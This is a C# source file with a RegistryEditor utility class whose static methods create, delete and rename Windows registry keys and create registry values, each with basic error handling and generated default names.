using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Extensions;

namespace xClient.Core.Registry
{
    public class RegistryEditor
    {

        #region RegistryKey
        /// <summary>
        /// Attempts to create the desired sub key to the specified parent.
        /// </summary>
        /// <param name="parentPath">The path to the parent for which to create the sub-key on.</param>
        /// <param name="name">output parameter that holds the name of the sub-key that was create.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns boolean value for if the operation failed or succeded.</returns>
        public static bool CreateRegistryKey(string parentPath, out string name, out string errorMsg)
        {
            name = "";
            try
            {
                RegistryKey parent = RegistrySeeker.GetWritableRegistryKey(parentPath);


                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running as administrator";
                    return false;
                }

                //Try to find available names
                int i = 1;
                string testName = String.Format("New Key #{0}", i);

                while (parent.ContainsSubKey(testName))
                {
                    i++;
                    testName = String.Format("New Key #{0}", i);
                }
                name = testName;

                using (RegistryKey child = parent.CreateSubKeySafe(name))
                {
                    //Child could not be created
                    if (child == null)
                    {
                        errorMsg = "Cannot create key: Error writing to the registry";
                        return false;
                    }
                }

                //Child was successfully created
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        /// <summary>
        /// Attempts to delete the desired sub-key from the specified parent.
        /// </summary>
        /// <param name="name">The name of the sub-key to delete.</param>
        /// <param name="parentPath">The path to the parent for which to delete the sub-key on.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns boolean value for if the operation failed or succeded.</returns>
        public static bool DeleteRegistryKey(string name, string parentPath, out string errorMsg)
        {
            try
            {
                RegistryKey parent = RegistrySeeker.GetWritableRegistryKey(parentPath);

                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running as administrator";
                    return false;
                }

                //Child does not exist
                if (!parent.ContainsSubKey(name))
                {
                    errorMsg = "The registry: " + name + " does not exist in: " + parentPath;
                    //If child does not exists then the action has already succeded
                    return true;
                }

                bool success = parent.DeleteSubKeyTreeSafe(name);

                //Child could not be deleted
                if (!success)
                {
                    errorMsg = "Cannot delete key: Error writing to the registry";
                    return false;
                }

                //Child was successfully deleted
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// Attempts to rename the desired key.
        /// </summary>
        /// <param name="oldName">The name of the key to rename.</param>
        /// <param name="newName">The name to use for renaming.</param>
        /// <param name="parentPath">The path of the parent for which to rename the key.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns boolean value for if the operation failed or succeded.</returns>
        public static bool RenameRegistryKey(string oldName, string newName, string parentPath, out string errorMsg)
        {
            try
            {

                RegistryKey parent = RegistrySeeker.GetWritableRegistryKey(parentPath);

                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running as administrator";
                    return false;
                }

                //Child does not exist
                if (!parent.ContainsSubKey(oldName))
                {
                    errorMsg = "The registry: " + oldName + " does not exist in: " + parentPath;
                    //If child does not exists then the action has already succeded
                    return false;
                }

                bool success = parent.RenameSubKeySafe(oldName, newName);

                //Child could not be deleted
                if (!success)
                {
                    errorMsg = "Cannot rename key: Error writing to the registry";
                    return false;
                }

                //Child was successfully deleted
                errorMsg = "";
                return true;

            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        #endregion

        #region RegistryValue

        /// <summary>
        /// Attempts to create the desired value for the specified parent.
        /// </summary>
        /// <param name="parentPath">The path to the parent for which to create the sub-key on.</param>
        /// <param name="kind">The type of the registry value to create.</param>
        /// <param name="name">output parameter that holds the name of the registry value that was create.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns boolean value for if the operation failed or succeded.</returns>
        public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name, out string errorMsg)
        {
            name = "";
            try
            {
                RegistryKey key = RegistrySeeker.GetWritableRegistryKey(keyPath);

                //Invalid can not open parent
                if (key == null)
                {
                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running as administrator";
                    return false;
                }

                //Try to find available names
                int i = 1;
                string testName = String.Format("New Value #{0}", i);

                while (key.ContainsValue(testName))
                {
                    i++;
                    testName = String.Format("New Value #{0}", i);
                }
                name = testName;

                bool success = key.CreateValueSafe(name, kind.GetDefault(), kind);

                //Child could not be created
                if (!success)
                {
                    errorMsg = "Cannot create value: Error writing to the registry";
                    return false;
                }

                //Child was successfully created
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        #endregion
    }
}
